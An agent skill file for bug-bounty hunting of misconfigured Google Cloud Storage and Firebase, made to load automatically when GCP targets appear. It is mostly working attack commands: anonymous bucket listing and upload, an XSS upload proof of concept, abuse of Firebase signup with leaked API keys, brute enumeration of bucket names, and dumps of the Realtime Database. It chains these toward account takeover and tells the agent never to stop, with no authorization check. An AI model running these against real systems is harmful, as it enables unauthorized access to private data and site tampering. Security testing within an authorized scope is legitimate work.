---
name: hunt-gcs-misconfig
description: "Use this skill when you see storage.googleapis.com URLs, *.appspot.com, *.firebaseapp.com, gs:// references in code, Firebase config blobs in JS (apiKey + projectId + storageBucket), Cloud Run *.run.app endpoints linking to storage, or scope mentions GCP/Firebase. Load automatically when DNS resolves to Google IP ranges or CNAMEs to c.storage.googleapis.com. Only invoke if real impact potential exists — anonymous WRITE, sensitive READ, Firebase rule bypass reading other-user data. Skip theoretical findings."
type: hunt
---

# Hunt: Google Cloud Storage Misconfiguration

GCS misconfigurations follow patterns similar to S3 but with their own famous traps — especially `allUsers` vs `allAuthenticatedUsers` (where "authenticated" means ANY Google account, not the project's users), and Firebase Storage rules that mistakenly allow `request.auth == null`.

## Crown Jewel Targets
- Buckets named `<projectid>.appspot.com` (default Firebase / App Engine bucket) — often hold uploads
- Buckets serving the live app's static assets (anonymous WRITE = supply-chain XSS)
- Firebase Storage backing mobile/web apps with weak rules
- Buckets storing backups, ML training data, analytics exports
- Cloud Run service URLs (`*.run.app`) that proxy GCS reads with broken auth
- Datastore/Firestore export buckets with PII dumps
- Cloud Build artifact buckets exposing source archives

## Detection Signals
- `*.storage.googleapis.com` or `storage.googleapis.com/<bucket>/…` URLs
- `<bucket>.appspot.com` references (Firebase default)
- Firebase web config JSON in HTML: `{ apiKey: "...", authDomain: "...firebaseapp.com", projectId: "...", storageBucket: "...appspot.com" }`
- Anonymous GET to `https://storage.googleapis.com/storage/v1/b/<bucket>/o` returns object list → world-readable
- 200 on `https://storage.googleapis.com/storage/v1/b/<bucket>/iam/testPermissions?permissions=storage.objects.create` from unauthed = anonymous create allowed
- `x-goog-*` headers in responses
- `gs://` URIs in source code, Dockerfiles, Terraform, k8s manifests
- Firestore/RTDB URLs: `<project>.firebaseio.com/.json` (unauth-readable check)

## Attack Techniques

1. **Anonymous READ (`allUsers` granted `storage.objectViewer`)**
   ```bash
   curl https://storage.googleapis.com/storage/v1/b/BUCKET/o
   gsutil ls gs://BUCKET           # if gsutil configured anon: use -o "GSUtil:default_api_version=2" with no creds
   curl https://storage.googleapis.com/BUCKET/path/to/object
   ```

2. **Anonymous WRITE (`allUsers` granted `storage.objectCreator` / `storage.objectAdmin`)**
   ```bash
   curl -X POST --data-binary @poc.html \
     -H "Content-Type: text/html" \
     "https://storage.googleapis.com/upload/storage/v1/b/BUCKET/o?uploadType=media&name=h1-poc.html"
   curl https://storage.googleapis.com/BUCKET/h1-poc.html
   ```
   Critical — overwrite trusted JS = stored XSS to every visitor. Upload benign PoC only.

3. **`allAuthenticatedUsers` trap**
   This grants ANY Google account (gmail.com user) the permission. Devs read it as "our authenticated users". Authenticate with a throwaway Google account and access.
   ```bash
   gcloud auth login throwaway@gmail.com
   gsutil ls gs://BUCKET
   ```

4. **IAM testPermissions enumeration (no auth required)**
   ```bash
   for p in storage.objects.list storage.objects.get storage.objects.create storage.objects.delete storage.buckets.get storage.buckets.setIamPolicy; do
     echo "== $p"
     curl -s "https://storage.googleapis.com/storage/v1/b/BUCKET/iam/testPermissions?permissions=$p"
   done
   ```
   Returned permissions = ones AllUsers (anonymous) has. Powerful enum.

5. **Firebase Storage rule bypass**
   Default rules: `allow read, write: if request.auth != null;` — anyone with a Firebase Auth account (free signup) can read/write everything. Worse if app uses `if request.auth == null;` (joke but real). Or `match /{allPaths=**} { allow read; }`.
   - Sign up via Firebase Auth REST API with the leaked `apiKey`.
   - Use the ID token to access Storage.
   ```bash
   AK=AIzaSyBleakedKey
   curl -s -H "Content-Type: application/json" \
     -d '{"email":"x@x.tld","password":"Password123!","returnSecureToken":true}' \
     "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$AK"
   # use returned idToken as Authorization: Bearer
   ```

6. **Firestore / Realtime DB unauth read**
   - RTDB: `curl https://<project>.firebaseio.com/.json` returns whole DB if read rules are public.
   - Firestore: similar via REST API with project's apiKey + collection scan.
   - Often paired with Storage misconfig (same project).

7. **Predictable bucket name enumeration**
   ```bash
   for suf in "" -prod -staging -dev -backup -logs -uploads -assets -static -data .appspot.com; do
     b="target${suf}"
     code=$(curl -s -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/storage/v1/b/$b")
     [ "$code" != "404" ] && echo "$code $b"
   done
   ```

8. **Signed URL leakage**
   GCS signed URLs (`X-Goog-Signature`) leak in client code or referrer; reusable until expiry. Also check for `goog-resumable-upload-id` reuse.

9. **Cloud Run / App Engine adjacent misconfig**
   `*.run.app` services with `--allow-unauthenticated` proxy authenticated GCS calls — anonymous user inherits service-account perms (chain to `cloud-iam-deep`).

## Payloads

```bash
# Comprehensive bucket audit
B=target-bucket
echo "[*] Metadata"
curl -s "https://storage.googleapis.com/storage/v1/b/$B"
echo "[*] IAM"
curl -s "https://storage.googleapis.com/storage/v1/b/$B/iam"
echo "[*] List objects"
curl -s "https://storage.googleapis.com/storage/v1/b/$B/o?maxResults=10"
echo "[*] testPermissions"
for p in storage.objects.{list,get,create,delete} storage.buckets.{get,setIamPolicy,delete}; do
  echo -n "$p => "
  curl -s "https://storage.googleapis.com/storage/v1/b/$B/iam/testPermissions?permissions=$p"
  echo
done
```

```bash
# Firebase config harvest from JS bundle
curl -s https://target.com/main.js | grep -oE '(apiKey|authDomain|projectId|storageBucket|messagingSenderId|appId)["\x27]?\s*:\s*["\x27][^"\x27]+' | sort -u
```

```bash
# Firebase Realtime DB unauth dump probe
PROJ=target-project
curl -s "https://$PROJ.firebaseio.com/.json?shallow=true"
```

```bash
# Anonymous upload PoC
echo "<html><body><script>alert(document.domain)</script></body></html>" > /tmp/poc.html
curl -X POST --data-binary @/tmp/poc.html \
  -H "Content-Type: text/html" \
  "https://storage.googleapis.com/upload/storage/v1/b/$B/o?uploadType=media&name=h1-poc-$(date +%s).html" -i
```

## Bypass Methods
- Org policy `iam.allowedPolicyMemberDomains` may block `allUsers` grants org-wide → look for older buckets created before policy was applied
- VPC Service Controls block from internet → bucket appears 403 unless you find an in-VPC SSRF
- Bucket-level vs object-level ACL — bucket may be locked but individual objects can be `acl: public-read`
- Uniform bucket-level access ON disables per-object ACLs (good for defender, but the IAM grants still apply)
- `gs://` URLs that 403 in browser may serve via XML API at `https://storage.googleapis.com/BUCKET/path`
- Firebase Auth domain restriction (`authorizedDomains`) does NOT prevent REST signup with the apiKey — only blocks redirect-based flows

## Tools
- **gsutil** — `gsutil ls -L gs://BUCKET` (auth) / unauth via curl
- **gcloud** — `gcloud storage buckets describe gs://BUCKET --project=…`
- **gcs-bucket-enumerator** — bulk name probe
- **GCPBucketBrute** — https://github.com/RhinoSecurityLabs/GCPBucketBrute — wordlist + IAM permission enum
- **cloud_enum --gcp** — multi-cloud GCS discovery
- **firebase-extractor** / **firepwn** — Firebase recon tools
- **firebaseExploiter** — https://github.com/securebinary/firebaseExploiter
- **nuclei** templates: `cloud/gcp/gcs-public-bucket.yaml`, `misconfiguration/firebase/`
- **trufflehog gcs** — scan bucket contents for secrets

## Impact
- **Critical** — anonymous WRITE on app-serving bucket; mass PII READ; Firebase rules allow cross-user read of private chats / payments / docs; service-account key found in a public object
- **High** — backup READ with hashed credentials; signed URL leakage to high-value private docs; Firestore dump of user records
- **Medium** — listing of internal filenames without sensitive content; analytics export with non-PII data
- Buckets containing only public marketing assets are NOT bounty-worthy.

## Chain Potential
- Anonymous WRITE → overwrite JS → stored XSS on trusted origin → ATO
- READ Firebase apiKey + open signup → Storage write → app compromise
- Service-account JSON in object → activate with `gcloud auth activate-service-account` → enumerate IAM (chain into `cloud-iam-deep`)
- GCS bucket fronts a Cloud Run service → SSRF/auth bypass in service inherits SA permissions
- Firestore dump + email enumeration + password reuse → ATO across multiple users
- App Engine default bucket `<proj>.appspot.com` write → tamper App Engine deployments

## Fallback Chain
1. Discover bucket names from CNAMEs, JS bundles, Firebase configs, gs:// references, predictable patterns; probe each via metadata, IAM, and testPermissions endpoints.
2. For each accessible bucket, enumerate objects, download samples, scan for secrets; if write is allowed, place a single benign PoC and stop.
3. If anonymous is locked, sign up a throwaway Google account and retry to catch the `allAuthenticatedUsers` trap; sign up via Firebase Auth REST and retry the Storage rules.
4. If GCS is hardened, pivot to Firestore/RTDB unauth reads, Cloud Run unauth services, App Engine default endpoints, leaked service-account JSON in code repos — Never stop because one technique failed.
